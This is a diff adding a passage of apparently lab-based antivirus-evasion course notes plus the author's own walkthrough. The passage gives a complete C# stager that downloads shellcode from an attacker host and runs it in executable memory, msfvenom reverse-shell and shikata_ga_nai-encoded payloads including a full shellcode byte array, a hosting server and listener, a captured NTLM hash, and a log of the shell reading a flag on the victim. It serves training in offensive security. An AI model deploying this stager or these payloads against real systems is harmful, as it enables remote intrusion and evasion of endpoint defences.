@@ -451,3 +451,457 @@ For staged payloads, you will have:
 Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size.
 The final shellcode isn't embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more.
 The final shellcode is loaded in memory and never touches the disk. This makes it less prone to be detected by AV solutions.
+You can reuse the same stage0 dropper for many shellcodes, as you can simply replace the final shellcode that gets served to the victim machine.
+In conclusion, we can't say that either type is better than the other unless we add some context to it. In general, stageless payloads are better suited for networks with lots of perimeter security, as it doesn't rely on having to download the final shellcode from the Internet. If, for example, you are performing a USB Drop Attack to target computers in a closed network environment where you know you won't get a connection back to your machine, stageless is the way to go.
+Staged payloads, on the other hand, are great when you want your footprint on the local machine to be reduced to a minimum. Since they execute the final payload in memory, some AV solutions might find it harder to detect them. They are also great for avoiding exposing your shellcodes (which usually take considerable time to prepare), as the shellcode isn't dropped into the victim's disk at any point (as an artifact).
+Stagers in Metasploit
+When creating payloads with msfvenom or using them directly in Metasploit, you can choose to use either staged or stageless payloads. As an example, if you want to generate a reverse TCP shell, you will find two payloads exist for that purpose with slightly different names (notice the _ versus / after shell):
+Payload	Type
+windows/x64/shell_reverse_tcp
+Stageless payload
+windows/x64/shell/reverse_tcp
+Staged payload
+You will generally find that the same name patterns are applied to other types of shells. To use a stageless Meterpreter, for example, we would use the windows/x64/meterpreter_reverse_tcp, rather than windows/x64/meterpreter/reverse_tcp, which works as its staged counterpart.
+Creating Your Own Stager
+To create a staged payload, we will use a slightly modified version of the stager code provided by [@mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs). The full code of our stager can be obtained here, but is also available in your Windows machine at C:\Tools\CS Files\StagedPayload.cs:
+The code may look intimidating at first but is relatively straightforward. Let's analyze what it does step by step.
+```text
+using System;
+using System.Net;
+using System.Text;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography.X509Certificates;
+
+public class Program {
+  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+  public static void Main()
+  {
+    string url = "https://ATTACKER_IP/shellcode.bin";
+    Stager(url);
+  }
+
+  public static void Stager(string url)
+  {
+
+    WebClient wc = new WebClient();
+    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+    byte[] shellcode = wc.DownloadData(url);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+```
+The first part of the code will import some Windows API functions via P/Invoke. The functions we need are the following three from kernel32.dll:
+WinAPI Function	Description
+[VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)	Allows us to reserve some memory to be used by our shellcode.
+[CreateThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)	Creates a thread as part of the current process.
+[WaitForSingleObject()](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)	Used for thread synchronization. It allows us to wait for a thread to finish before continuing.
+The part of the code in charge of importing these functions is the following:
+```text
+//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
+[DllImport("kernel32")]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
+[DllImport("kernel32")]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
+[DllImport("kernel32")]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+```
+The most significant part of our code will be in the Stager() function, where the stager logic will be implemented. The Stager function will receive a URL from where the shellcode to be executed will be downloaded.
+The first part of the Stager() function will create a new WebClient() object that allows us to download the shellcode using web requests. Before making the actual request, we will overwrite the ServerCertificateValidationCallback method in charge of validating SSL certificates when using HTTPS requests so that the WebClient doesn't complain about self-signed or invalid certificates, which we will be using in the web server hosting the payloads. After that, we will call the DownloadData() method to download the shellcode from the given URL and store it into the shellcode variable:
+```text
+WebClient wc = new WebClient();
+ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+byte[] shellcode = wc.DownloadData(url);
+```
+Once our shellcode is downloaded and available in the shellcode variable, we'll need to copy it into executable memory before actually running it. We use VirtualAlloc() to request a memory block from the operating system. Notice that we request enough memory to allocate shellcode.Length bytes, and set the PAGE_EXECUTE_READWRITE flag, making the assigned memory executable, readable and writable. Once our executable memory block is reserved and assigned to the codeAddr variable, we use Marshal.Copy() to copy the contents of the shellcode variable in the codeAddr variable.
+```text
+UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+```
+Now that we have a copy of the shellcode allocated in a block of executable memory, we use the CreateThread() function to spawn a new thread on the current process that will execute our shellcode. The third parameter passed to CreateThread points to codeAddr, where our shellcode is stored, so that when the thread starts, it runs the contents of our shellcode as if it were a regular function. The fifth parameter is set to 0, meaning the thread will start immediately.
+Once the thread has been created, we will call the WaitForSingleObject() function to instruct our current program that it has to wait for the thread execution to finish before continuing. This prevents our program from closing before the shellcode thread gets a chance to execute:
+```text
+IntPtr threadHandle = IntPtr.Zero;
+UInt32 threadId = 0;
+IntPtr parameter = IntPtr.Zero;
+threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+```
+To compile the code, we suggest copying it into a Windows machine as a file called staged-payload.cs and compiling it with the following command:
+```text
+PowerShell
+```
+```text
+PS C:\> csc staged-payload.cs
+```
+Using our stager to run a reverse shell
+Once our payload is compiled, we will need to set up a web server to host the final shellcode. Remember that our stager will connect to this server to retrieve the shellcode and execute it in the victim machine in-memory. Let's start by generating a shellcode (the name of the file needs to match the URL in our stager):
+
+## Exploitation
+```text
+AttackBox
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
+```
+Notice that we are using the raw format for our shellcode, as the stager will directly load whatever it downloads into memory.
+Now that we have a shellcode, let's set up a simple HTTPS server. First, we will need to create a self-signed certificate with the following command:
+```text
+AttackBox
+
+user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
+```
+You will be asked for some information, but feel free to press enter for any requested information, as we don't need the SSL certificate to be valid. Once we have an SSL certificate, we can spawn a simple HTTPS server using python3 with the following command:
+```text
+AttackBox
+
+user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
+```
+With all of this ready, we can now execute our stager payload. The stager should connect to the HTTPS server and retrieve the shellcode.bin file to load it into memory and run it on the victim machine. Remember to set up an nc listener to receive the reverse shell on the same port specified when running msfvenom:
+```text
+AttackBox
+
+user@AttackBox$ nc -lvp 7474
+```
+Do staged payloads deliver the full content of our payload in a single package? (yea/nay)
+*nay*
+Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? (yea/nay)
+*nay*
+Is the stage0 of a staged payload in charge of downloading the final payload to be executed? (yea/nay)
+*yea*
+Follow the instructions to create a staged payload and upload it into the THM Antivirus Check at http://10.10.195.70/
+```text
+PS C:\Users\thm> cd "C:\Tools\CS Files"
+PS C:\Tools\CS Files> csc .\StagedPayload.cs
+Microsoft (R) Visual C# Compiler version 4.8.3761.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ mkdir share
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Password321 public share
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.195.70,49996)
+[*] AUTHENTICATE_MESSAGE (AV-EVASION-PC\thm,AV-EVASION-PC)
+[*] User AV-EVASION-PC\thm authenticated successfully
+[*] thm::AV-EVASION-PC:aaaaaaaaaaaaaaaa:74736b907cbd6f8036fc0fdfbfb09a47:010100000000000000ecda51f2c9d801f5923e5921412b9f000000000100100059006f00640067006b006900640059000300100059006f00640067006b00690064005900020010006500530068004c007800470074004d00040010006500530068004c007800470074004d000700080000ecda51f2c9d80106000400020000000800300030000000000000000000000000200000c4c787e45b18d5bbaf1eeb4e73b04318e169500bed066dd6c64813c1f68ba5a80a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:public)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:public)
+[*] Closing down connection (10.10.195.70,49996)
+[*] Remaining connections []
+
+C:\Users\thm>copy "C:\Tools\CS Files\StagedPayload.exe" \\10.11.81.220\public\
+        1 file(s) copied.
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cd share
+```
+```text
+┌──(kali㉿kali)-[~/share]
+└─$ ls
+StagedPayload.exe
+```
+```text
+┌──(kali㉿kali)-[~/payloads]
+└─$ cd /home/kali/asm
+```
+```text
+┌──(kali㉿kali)-[~/asm]
+└─$ ls
+flag.c  shellcode.bin      thm      thm.c  thm.text
+flagx   staged-payload.cs  thm.asm  thm.o  thmx
+```
+```text
+┌──(kali㉿kali)-[~/asm]
+└─$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
+...+..............+.......+...+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+........+.......+.....+...+.......+.....+.......+.................+...+...+....+...........+.......+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*........+...+......+.+......+.....+....+......+.....+.......+.......................+.......+.....+.......+...+..+....+.....+.+.....+....+............+..+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+.+..+.+......+...+...+........+.......+...+.....+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*......+.+.....+.+........+....+..+.+............+......+..+...+......+.+.....+.........+..........+...+......+.....+....+..+...+......+.+..............+.+...........+...+.+...+...+.....+.........+...............+......+............+.+......+.....+...+.............+...+..+..........+..................+.....+......+.+..+...+.......+..+..........+......+...+.....+.+...+..+.+........+................+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+```
+```text
+┌──(kali㉿kali)-[~/asm]
+└─$ ls
+flag.c  localhost.pem  staged-payload.cs  thm.asm  thm.o     thmx
+flagx   shellcode.bin  thm                thm.c    thm.text
+```
+```text
+┌──(kali㉿kali)-[~/asm]
+└─$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()" 
+<string>:1: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
+
+──(kali㉿kali)-[~/share]
+└─$ ls
+StagedPayload.exe
+```
+```text
+┌──(kali㉿kali)-[~/share]
+└─$ nc -lvp 7474              
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::7474
+Ncat: Listening on 0.0.0.0:7474
+ls
+Ncat: Connection from 10.10.195.70.
+Ncat: Connection from 10.10.195.70:50013.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\App>ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\App>whoami
+whoami
+av-evasion-pc\av-victim
+
+C:\App>cd ..
+cd ..
+```
+```text
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\
+
+08/30/2022  11:36 PM    <DIR>          App
+11/14/2018  06:56 AM    <DIR>          EFI
+09/01/2022  12:24 AM    <DIR>          metasploit-framework
+05/13/2020  05:58 PM    <DIR>          PerfLogs
+08/31/2022  12:06 PM    <DIR>          Program Files
+08/31/2022  12:05 PM    <DIR>          Program Files (x86)
+08/30/2022  05:46 PM    <DIR>          Tools
+08/30/2022  11:45 PM    <DIR>          Users
+08/31/2022  02:03 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               9 Dir(s)   3,089,911,808 bytes free
+```
+```text
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users
+
+08/30/2022  11:45 PM    <DIR>          .
+08/30/2022  11:45 PM    <DIR>          ..
+08/31/2022  02:06 PM    <DIR>          Administrator
+08/30/2022  11:45 PM    <DIR>          av-victim
+12/12/2018  07:45 AM    <DIR>          Public
+09/01/2022  12:32 AM    <DIR>          thm
+               0 File(s)              0 bytes
+               6 Dir(s)   3,089,911,808 bytes free
+
+C:\Users>cd av-victim   
+cd av-victim
+
+C:\Users\av-victim>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\av-victim
+
+08/30/2022  11:45 PM    <DIR>          .
+08/30/2022  11:45 PM    <DIR>          ..
+08/31/2022  07:11 PM    <DIR>          Desktop
+08/30/2022  11:45 PM    <DIR>          Documents
+09/15/2018  07:19 AM    <DIR>          Downloads
+09/15/2018  07:19 AM    <DIR>          Favorites
+09/15/2018  07:19 AM    <DIR>          Links
+09/15/2018  07:19 AM    <DIR>          Music
+09/15/2018  07:19 AM    <DIR>          Pictures
+09/15/2018  07:19 AM    <DIR>          Saved Games
+09/15/2018  07:19 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              11 Dir(s)   3,089,911,808 bytes free
+
+C:\Users\av-victim>cd Desktop
+cd Desktop
+
+C:\Users\av-victim\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\av-victim\Desktop
+
+08/31/2022  07:11 PM    <DIR>          .
+08/31/2022  07:11 PM    <DIR>          ..
+08/31/2022  07:12 PM                28 flag.txt
+               1 File(s)             28 bytes
+               2 Dir(s)   3,089,911,808 bytes free
+
+C:\Users\av-victim\Desktop>more flag.txt
+more flag.txt
+THM{H3ll0-W1nD0ws-Def3nd3r!}
+```
+### Introduction to Encoding and Encryption
+What is Encoding?
+Encoding is the process of changing the data from its original state into a specific format depending on the algorithm or type of encoding. It can be applied to many data types such as videos, HTML, URLs, and binary files (EXE, Images, etc.).
+Encoding is an important concept that is commonly used for various purposes, including but not limited to:
+Program compiling and execution
+Data storage and transmission
+Data processing such as file conversion
+Similarly, when it comes to AV evasion techniques, encoding is also used to hide shellcode strings within a binary. However, encoding is not enough for evasion purposes. Nowadays, AV software is more intelligent and can analyze a binary, and once an encoded string is found, it is decoded to check the text's original form.
+You can also use two or more encoding algorithms in tandem to make it harder for the AV to figure out the hidden content. The following figure shows that we converted the "THM" string into hexadecimal representation and then encoded it using Base64. In this case, you need to make sure that your dropper now handles such encoding to restore the string to its original state.
+What is Encryption?
+Encryption is one of the essential elements of information and data security which focuses on preventing unauthorized access and manipulation of data. The encryption process involves converting plaintext (unencrypted content) into an encrypted version called Ciphertext. The Ciphertext can't be read or decrypted without knowing the algorithm used in encryption as well as the key.
+Like encoding, encryption techniques are used for various purposes, such as storing and transmitting data securely, as well as end-to-end encryption. Encryption can be used in two ways: having a shared key between two parties or using public and private keys.
+For more information about encryption, we encourage you to check Encryption - Crypto 101 room.
+Encryption and Decryption Concepts!
+Why do we Need to Know About Encoding and Encryption?
+AV vendors implement their AV software to blocklist most public tools (such as Metasploit and others) using static or dynamic detection techniques. Therefore, without modifying the shellcode generated by these public tools, the detection rate for your dropper is high.
+Encoding and encryption can be used in AV evasion techniques where we encode and/or encrypt shellcode used in a dropper to hide it from AV software during the runtime. Also, the two techniques can be used not only to hide the shellcode but also functions, variables, etc. In this room, we mainly focus on encrypting the shellcode to evade Windows Defender.
+Is encoding shellcode only enough to evade Antivirus software? (yea/nay)
+*nay*
+Do encoding techniques use a key to encode strings or files? (yea/nay)
+*nay*
+Do encryption algorithms use a key to encrypt strings or files? (yea/nay)
+*yea*
+### Shellcode Encoding and Encryption
+Encode using MSFVenom
+Public Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim's disk.
+Let's generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to msfvenom with the following command:
+```text
+Listing Encoders within the Metasploit Framework
+
+           
+user@AttackBox$ msfvenom --list encoders | grep excellent
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+```
+We can indicate we want to use the shikata_ga_nai encoder with the -e(encoder) switch and then specify we want to encode the payload three times with the -i (iterations) switch:
+```text
+Encoding using the Metasploit Framework (Shikata_ga_nai)
+
+           
+user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+x86/shikata_ga_nai succeeded with size 395 (iteration=1)
+x86/shikata_ga_nai succeeded with size 422 (iteration=2)
+x86/shikata_ga_nai chosen with final size 422
+Payload size: 422 bytes
+Final size of csharp file: 2170 bytes
+```
+If we try uploading our newly generated payload to our test machine, the AV will instantly flag it before we even get a chance to execute it:
+Windows Defender detected our payload as malicious!
+```text
+┌──(kali㉿kali)-[~/asm]
+└─$ msfvenom -a x86 --platform Windows LHOST=10.11.81.220 LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp 
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai succeeded with size 378 (iteration=1)
+x86/shikata_ga_nai succeeded with size 405 (iteration=2)
+x86/shikata_ga_nai chosen with final size 405
+Payload size: 405 bytes
+Final size of csharp file: 2083 bytes
+byte[] buf = new byte[405] {
+0xba,0xaf,0x72,0xdf,0xab,0xda,0xca,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,
+0x5f,0x31,0x53,0x14,0x03,0x53,0x14,0x83,0xc3,0x04,0x4d,0x87,0x04,0x69,0x48,
+0x1c,0x9f,0x9a,0xd7,0x39,0x6d,0x71,0x41,0x9a,0xb9,0xbf,0x3c,0x42,0x8f,0x57,
+0x24,0x70,0x87,0xbd,0xdb,0x9e,0xab,0x20,0xca,0x35,0x84,0x79,0xde,0xcc,0x46,
+0x05,0x03,0xad,0x2f,0x35,0xf8,0x91,0x48,0x4b,0x57,0x56,0x84,0x2a,0x69,0x5f,
+0xf9,0x4a,0x18,0x2c,0x9b,0x88,0xd2,0xa8,0xab,0x6f,0x65,0xd0,0x8b,0x01,0xd6,
+0xc8,0x03,0x0d,0x1e,0x21,0x61,0x62,0x29,0xb0,0x0d,0x1a,0x39,0x49,0xee,0x43,
+0x2f,0xf7,0xec,0x52,0xb2,0x9a,0x10,0xc8,0xdf,0x02,0x6e,0xac,0x18,0x3d,0x5e,
+0x68,0x94,0xb9,0x7f,0xf4,0xe3,0x34,0x1f,0x0a,0x67,0x6c,0x6a,0xb2,0x41,0x48,
+0xe7,0x4c,0x5a,0xd1,0x79,0x55,0xc7,0x0e,0xa3,0x87,0xbb,0x07,0x52,0x41,0x6e,
+0x13,0x7f,0x4d,0xc5,0x47,0xc9,0xad,0xdc,0x5a,0xee,0x53,0xae,0xfb,0x92,0x0b,
+0x8a,0x03,0x69,0xd8,0xb4,0x88,0xa6,0x8c,0xdb,0xf5,0x2f,0xc3,0x5d,0xd0,0x1b,
+0xab,0x10,0x97,0x2e,0x25,0xe9,0xc6,0x58,0x38,0xd2,0xf9,0xcd,0x1e,0x6c,0x87,
+0x0c,0x56,0x9d,0xfa,0xf4,0xa2,0x1b,0x36,0x18,0xfd,0x31,0x33,0xa5,0x14,0x1b,
+0xad,0x97,0x82,0x0a,0x84,0x0f,0xf0,0xb3,0x4a,0x22,0x63,0x80,0xc8,0xbb,0x78,
+0xe2,0x7c,0x39,0x7f,0xbf,0x4c,0x17,0x2a,0x7e,0x79,0x80,0x50,0x57,0x97,0xe4,
+0x73,0x8f,0x64,0x36,0xa3,0xee,0x7b,0xc1,0xea,0x4a,0xe1,0x20,0x8a,0x89,0xdb,
+0x98,0x85,0x31,0xbf,0x43,0xe5,0x76,0x8c,0x06,0x2a,0x89,0xe4,0xf7,0xba,0xb1,
+0xe0,0xb0,0x05,0x17,0xf6,0xa2,0x36,0xd7,0xc8,0xde,0xb9,0xcb,0xa1,0x2a,0xdc,
+0x04,0x6a,0xed,0x27,0x4a,0x7c,0x1d,0x83,0xe6,0x34,0x2f,0x16,0xb5,0x0a,0x35,
+0x48,0xbd,0x2a,0x36,0x07,0x62,0x51,0x3d,0x67,0x72,0x65,0x5f,0x4c,0x5b,0xf7,
+0x79,0xcb,0x1c,0x0f,0x26,0xbf,0xb7,0xd0,0x6a,0x88,0x0e,0xeb,0xe5,0x2e,0x69,
+0x4f,0x77,0x07,0x79,0xd0,0xc4,0x67,0xc2,0xbf,0xde,0xd9,0x62,0x9c,0x66,0x16,
+0x79,0xea,0x79,0xea,0x4b,0x7f,0x1c,0xee,0x5a,0xe1,0x8b,0x71,0x32,0xbd,0xc5,
+0xce,0xbd,0xd5,0x6f,0xf2,0xce,0x1c,0xe9,0x4a,0xbe,0x36,0x1d,0x7f,0x96,0x84,
+0x7d,0x8c,0xee,0x23,0x1b,0xa4,0x77,0x6d,0xf0,0xb0,0xd2,0x3e,0x90,0x6d,0x5d,
+0x3f,0x43,0x29,0x99,0x33,0xa9,0xe9,0x89,0x77,0x40,0xcd,0x1d,0x44,0xea,0x2a };
+```
+If encoding doesn't work, we can always try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Let's try that now.
+Encryption using MSFVenom
+You can easily generate encrypted payloads using msfvenom. The choices for encryption algorithms are, however, a bit scarce. To list the available encryption algorithms, you can use the following command:
+```text
+Listing encryption modules within the Metasploit Framework
+
+           
+user@AttackBox$ msfvenom --list encrypt
+Framework Encryption Formats [--encrypt <value>]
+================================================
+
